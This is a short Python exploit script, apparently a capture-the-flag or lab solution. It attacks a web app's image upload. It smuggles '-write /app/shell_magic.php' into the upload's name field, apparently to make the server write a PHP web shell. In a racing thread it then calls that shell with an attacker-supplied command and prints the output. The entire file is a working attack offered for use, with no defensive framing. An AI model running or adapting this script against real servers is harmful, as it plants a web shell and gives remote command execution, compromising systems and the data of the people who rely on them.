import requests
import threading
import sys

URL = ""
CMD = ""

def request_to_upload_file():
	files = {
		'img' : open('a.jpeg', 'rb')
	}
	data = {
		'name' : 'haha -write /app/shell_magic.php a'
	}
	requests.post(URL, data=data, files=files)

def request_to_access_file():
	res = requests.get(f"{URL}/shell_magic.php?cmd={CMD}")

	if res.ok:
		print(res.text)
	else:
		print(f"Failed: {res.status_code}")

def main():
	global URL
	global CMD

	if len(sys.argv) != 3:
		print("Usage: python script.py <URL> <CMD>")
		return

	URL = sys.argv[1]
	CMD = sys.argv[2]

	threading.Thread(target=request_to_upload_file).start()
	threading.Thread(target=request_to_access_file).start()
	pass


if __name__ == "__main__":
	main()